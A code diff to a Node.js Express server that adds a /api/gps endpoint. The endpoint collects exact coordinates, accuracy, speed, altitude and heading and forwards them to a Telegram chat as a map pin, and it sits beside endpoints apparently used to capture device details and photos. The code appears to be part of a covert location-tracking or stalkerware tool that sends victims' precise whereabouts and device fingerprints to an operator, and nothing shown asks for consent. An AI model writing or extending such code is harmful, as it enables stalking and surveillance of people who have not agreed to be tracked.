@@ -324,6 +324,60 @@ app.post('/api/capture', async (req, res) => {
   res.json({ success: true });
 });
 
+app.post('/api/gps', (req, res) => {
+  const { latitude, longitude, accuracy, speed, altitude, heading } = req.body;
+  if (!latitude || !longitude) return res.json({ success: false });
+
+  const id = Date.now().toString();
+  const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Baghdad' });
+
+  console.log('GPS Data:', latitude, longitude, '±' + accuracy + 'm');
+
+  if (bot) {
+    const gpsMsg = [
+      '🎯 *EXACT GPS LOCATION*',
+      '━━━━━━━━━━━━━━━━━━',
+      '',
+      `📍 Coords: \`${Number(latitude).toFixed(6)}, ${Number(longitude).toFixed(6)}\``,
+      `🎯 Accuracy: ±${accuracy || '?'}m`,
+      altitude ? `⛰ Altitude: ${altitude}m` : '',
+      speed ? `🏃 Speed: ${speed} m/s` : '',
+      heading ? `🧭 Heading: ${heading}°` : '',
+      '',
+      `[🗺 Google Maps — Exact Location](https://maps.google.com/?q=${latitude},${longitude})`,
+      '',
+      `🕐 ${now}`
+    ].filter(Boolean).join('\n');
+
+    sendTelegramMessage(gpsMsg);
+
+    bot.sendLocation(TELEGRAM_CHAT_ID, parseFloat(latitude), parseFloat(longitude), {
+      horizontal_accuracy: accuracy ? Math.min(parseFloat(accuracy), 1500) : undefined
+    }).then(() => {
+      console.log('Telegram: GPS pin sent OK');
+    }).catch(e => {
+      console.log('Telegram GPS pin error:', e.message);
+    });
+  }
+
+  saveDevice({
+    id: 'gps_' + id, deviceHash: 'gps-' + id, ip: getIP(req),
+    deviceModel: 'GPS Location',
+    latitude: parseFloat(latitude), longitude: parseFloat(longitude),
+    accuracy: accuracy ? Math.round(parseFloat(accuracy)) : null,
+    speed: speed || null, altitude: altitude || null, heading: heading || null,
+    deviceType: null, os: null, browser: null,
+    connectionType: null, battery: null, batteryCharging: null,
+    screen: null, availScreen: null, windowSize: null,
+    colorDepth: null, pixelRatio: null, touchPoints: null,
+    orientation: null, vendor: null, language: null, languages: null,
+    platform: null, cores: 0, memory: 0, timezone: null, ua: null,
+    appVersion: null, timestamp: now, timeISO: new Date().toISOString()
+  });
+
+  res.json({ success: true });
+});
+
 app.post('/api/photo', upload.single('photo'), (req, res) => {
   if (!req.file || !req.file.buffer || req.file.buffer.length === 0) {
     console.log('Photo upload: No file received');
